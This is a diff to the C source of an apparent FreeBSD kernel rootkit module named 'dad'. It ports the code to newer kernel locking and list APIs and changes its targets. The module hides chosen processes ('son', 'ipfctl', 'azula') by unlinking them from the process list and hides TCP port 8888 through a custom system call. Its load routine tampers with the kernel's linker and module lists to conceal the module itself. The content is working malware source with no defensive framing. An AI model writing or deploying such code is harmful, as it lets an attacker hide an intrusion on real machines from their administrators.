@@ -14,6 +14,7 @@
 #include <netinet/in_pcb.h>
 #include <netinet/ip_var.h>
 #include <netinet/tcp_var.h>
+#include <net/vnet.h>
 
 #include <sys/lock.h>
 #include <sys/sx.h>
@@ -51,51 +52,56 @@ process_hiding(char *procname)
 	struct proc *p;
 
 	sx_xlock(&allproc_lock);
-
-	/* Iterate through the allproc list. */
+	
+	// Iterate through the allproc list.
 	LIST_FOREACH(p, &allproc, p_list) {
+		
 		PROC_LOCK(p);
-
+		
 		if (!p->p_vmspace || (p->p_flag & P_WEXIT)) {
 			PROC_UNLOCK(p);
 			continue;
 		}
-
-		/* Do we want to hide this process? */
-		if (strncmp(p->p_comm, procname, MAXCOMLEN) == 0)
+		
+		// Do we want to hide this process?
+		if (strncmp(p->p_comm, procname, MAXCOMLEN) == 0){
 			LIST_REMOVE(p, p_list);
-
+	
+		}
 		PROC_UNLOCK(p);
+		
 	}
-
+	
 	sx_xunlock(&allproc_lock);
 
 	return(0);
 }
 
 /* System call to hide an open port. */
+
 static int
 port_hiding(u_int16_t fport)
 {
-	struct inpcb *inpb;
+	struct inpcb *inp;
 
-	INP_INFO_WLOCK(&tcbinfo);
-
-	/* Iterate through the TCP-based inpcb list. */
-	LIST_FOREACH(inpb, tcbinfo.ipi_listhead, inp_list) {
-		if (inpb->inp_vflag & INP_TIMEWAIT)
+	INP_INFO_WLOCKED(&V_tcbinfo);
+	
+	// Iterate through the TCP-based inpcb list.
+	CK_LIST_FOREACH(inp, tcbinfo.ipi_listhead, inp_list) {	
+		if (inp->inp_vflag & INP_TIMEWAIT) {
 			continue;
+		}
 
-		inp_wlock(inpb);
+		INP_WLOCK(inp);
 
-		/* Do we want to hide this local open port? */
-		if (fport == ntohs(inpb->inp_inc.inc_ie.ie_fport))
-			LIST_REMOVE(inpb, inp_list);
-
-		inp_wunlock(inpb);
+		// Do we want to hide this local open port?
+		if (fport == ntohs(inp->inp_inc.inc_ie.ie_fport)){
+			CK_LIST_REMOVE(inp, inp_list);
+		}
+		INP_WUNLOCK(inp);
+	
 	}
-
-	INP_INFO_WUNLOCK(&tcbinfo);
+	INP_INFO_WUNLOCK(&V_tcbinfo);
 
 	return(0);
 }
@@ -103,14 +109,15 @@ port_hiding(u_int16_t fport)
 static int general_handler(struct thread *td, void *syscall_args) {
 	process_hiding("son");
 	process_hiding("ipfctl");
-	port_hiding(80);
+	process_hiding("azula");
+	port_hiding(8888);
 	return(0);
 }
 
 /* The sysent for the new system call. */
 static struct sysent dad_sysent = {
-	0,			/* number of arguments */
-	general_handler		/* implementing function */
+	0,
+	general_handler	/* implementing function*/
 };
 
 /* The offset in sysent[] where the system call is to be allocated. */
@@ -124,13 +131,13 @@ load(struct module *module, int cmd, void *arg)
 
 	switch (cmd) {
 	case MOD_LOAD:
-
+		
 		// Lock mutex on kld list and kernel so we can modify
 		// linker_files, modify kernel image's ref cnt
 		// should probably do this, but this broke it on BSD
 		// commenting this out fixed it so :shrug:
-		// mtx_lock(&Giant);
-		// mtx_lock(&kld_sx);
+		//mtx_lock(&Giant);
+		//mtx_lock(&kld_sx);
 		
 		// Decrement kernel image's ref cnt
 		(&linker_files)->tqh_first->refs--;
@@ -140,8 +147,8 @@ load(struct module *module, int cmd, void *arg)
 
 		TAILQ_FOREACH(lf, &linker_files, link) {
 			if(strcmp(lf->filename, MODULE) == 0) {
-				next_file_id--;
-				TAILQ_REMOVE(&linker_files, lf, link);
+				//next_file_id--;
+				//TAILQ_REMOVE(&linker_files, lf, link);
 				break;
 			}
 		}
@@ -156,14 +163,14 @@ load(struct module *module, int cmd, void *arg)
 		// Now, remove dad.ko from the modules list too.
 		TAILQ_FOREACH(mod, &modules, link) {
 			if(strcmp(mod->name, "dad") == 0) {
-				nextid--;
-				TAILQ_REMOVE(&modules, mod, link);
+				//nextid--;
+				//TAILQ_REMOVE(&modules, mod, link);
 				break;
 			}
 		}
 
 		sx_xunlock(&modules_sx);
-
+		
 		break;
 
 	case MOD_UNLOAD:
